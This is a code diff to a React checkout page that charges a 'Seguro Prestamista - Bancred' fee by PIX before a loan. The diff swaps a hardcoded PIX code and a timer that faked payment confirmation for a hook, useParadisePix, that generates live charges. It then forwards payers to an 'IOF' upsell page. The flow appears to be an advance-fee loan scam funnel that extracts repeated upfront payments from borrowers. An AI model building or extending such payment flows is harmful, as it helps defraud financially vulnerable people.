@@ -11,6 +11,7 @@ import {
   X,
   Wallet,
 } from "lucide-react";
+import { useParadisePix } from "@/hooks/useParadisePix";
 
 const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';
 
@@ -36,18 +37,15 @@ const calcSeguro = (valor: number) => {
   return { total, morte, desemprego, emergencia };
 };
 
-const PIX_PAYLOAD =
-  "00020101021226800014br.gov.bcb.pix2558qrcode.mkip.com.br/v1/2684c286-628c-4f2d-b1fd-20512cdb336b5204000053039865802BR5915TTKBRASILSEGURO6008SAOPAULO62070503***63044FF2";
-
 const Pagamento = () => {
   const [params] = useSearchParams();
   const navigate = useNavigate();
   const valor = Number(params.get("valor") || 5000);
+  const nome = params.get("nome") || "";
   const seguro = useMemo(() => calcSeguro(valor), [valor]);
 
   const [oferta, setOferta] = useState<"principal" | "extra1" | "extra2">("principal");
   const [showPix, setShowPix] = useState(false);
-  const [pixLoading, setPixLoading] = useState(true);
   const [copied, setCopied] = useState(false);
 
   const valorOfertaExtra1 = 7000;
@@ -60,37 +58,40 @@ const Pagamento = () => {
   const seguroAtual =
     oferta === "principal" ? seguro : oferta === "extra1" ? seguroExtra1 : seguroExtra2;
 
-  useEffect(() => {
-    if (showPix) {
-      setPixLoading(true);
-      const t = setTimeout(() => setPixLoading(false), 2200);
-      return () => clearTimeout(t);
-    }
-  }, [showPix]);
+  const { create, reset, pix, loading: pixLoading, error: pixError, status } = useParadisePix(() => {
+    navigate(`/up1?${params.toString()}`);
+  });
 
-  // Simula confirmação do pagamento e segue para o primeiro upsell (IOF)
-  useEffect(() => {
-    if (showPix && !pixLoading) {
-      const t = setTimeout(() => {
-        navigate(`/up1?${params.toString()}`);
-      }, 12000);
-      return () => clearTimeout(t);
-    }
-  }, [showPix, pixLoading, navigate, params]);
-
-  const handleCopy = async () => {
+  const openPix = async () => {
+    setShowPix(true);
     try {
-      await navigator.clipboard.writeText(PIX_PAYLOAD);
-      setCopied(true);
-      setTimeout(() => setCopied(false), 2200);
+      await create({
+        amountCents: Math.round(seguroAtual.total * 100),
+        description: `Seguro Prestamista - Bancred (${formatBRL(valorAtual)})`,
+        stage: "seguro",
+        customer: nome ? { name: nome } : undefined,
+      });
     } catch {
-      // ignore
+      /* erro tratado pelo hook */
     }
   };
 
-  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=0&data=${encodeURIComponent(
-    PIX_PAYLOAD
-  )}`;
+  const closePix = () => {
+    setShowPix(false);
+    reset();
+    setCopied(false);
+  };
+
+  const handleCopy = async () => {
+    if (!pix?.qr_code) return;
+    try {
+      await navigator.clipboard.writeText(pix.qr_code);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2200);
+    } catch {
+      /* ignore */
+    }
+  };
 
   const OfferCard = ({
     id,
@@ -200,7 +201,7 @@ const Pagamento = () => {
 
         <button
           type="button"
-          onClick={() => setShowPix(true)}
+          onClick={openPix}
           style={{
             width: "100%",
             padding: "16px 20px",
@@ -241,7 +242,7 @@ const Pagamento = () => {
             justifyContent: "center",
             zIndex: 60,
           }}
-          onClick={() => setShowPix(false)}
+          onClick={closePix}
         >
           <div
             onClick={(e) => e.stopPropagation()}
@@ -266,7 +267,7 @@ const Pagamento = () => {
               </div>
               <button
                 type="button"
-                onClick={() => setShowPix(false)}
+                onClick={closePix}
                 aria-label="Fechar"
                 style={{ background: "transparent", border: "none", cursor: "pointer", color: "#6B7280" }}
               >
@@ -310,10 +311,12 @@ const Pagamento = () => {
               </div>
             </div>
 
-            {pixLoading ? (
+            {pixLoading || !pix ? (
               <div style={{ display: "flex", flexDirection: "column", alignItems: "center", padding: "40px 0" }}>
                 <Loader2 size={42} color="#1C68E3" style={{ animation: "spin 1s linear infinite" }} />
-                <div style={{ marginTop: 18, color: "#6B7280", fontSize: 14 }}>Gerando seu código PIX...</div>
+                <div style={{ marginTop: 18, color: "#6B7280", fontSize: 14 }}>
+                  {pixError ? pixError : "Gerando seu código PIX..."}
+                </div>
                 <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
               </div>
             ) : (
@@ -330,7 +333,7 @@ const Pagamento = () => {
                   </div>
                   <div style={{ display: "flex", justifyContent: "center" }}>
                     <img
-                      src={qrUrl}
+                      src={pix.qr_image}
                       alt="QR Code PIX"
                       width={240}
                       height={240}
@@ -354,7 +357,7 @@ const Pagamento = () => {
                     marginBottom: 12,
                   }}
                 >
-                  {PIX_PAYLOAD}
+                  {pix.qr_code}
                 </div>
 
                 <button
